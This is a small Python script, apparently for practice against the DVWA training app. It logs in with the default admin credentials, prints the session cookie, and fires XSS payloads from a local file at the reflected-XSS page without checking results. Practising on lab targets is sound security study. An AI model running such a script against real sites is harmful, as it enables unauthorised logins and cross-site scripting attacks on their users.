from requests.compat import urljoin
import requests
import sys
import re

def login(rhost):
    s = requests.session()
    login_url = "http://{}/login.php".format(rhost)
    req = s.get(login_url)
    match = re.search(r'([a-z,0-9]){32}', req.text)
    token = match.group(0)
    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
    return s


xss_ref_path = 'vulnerabilities/xss_r/'
param = '?name=NAME'

def attack(rhost,session):
    xss_param_values = []
    xss_param_values.extend(open("xss.txt", "r", errors='replace').readlines())

    for v in xss_param_values:
        # Prepare the GET request
        xssr_url = urljoin("http://"+rhost, xss_ref_path + param + v)
        # Send the GET request
        r = requests.get(xssr_url, cookies=session.cookies)
        #print(r.url)

def main():
    rhost = sys.argv[1]
    sess = login(rhost)
    sess = attack(rhost, sess)
    print("")
    # print("The query result is: {}".format(extracted_data))
        
if __name__ == "__main__":
    main()

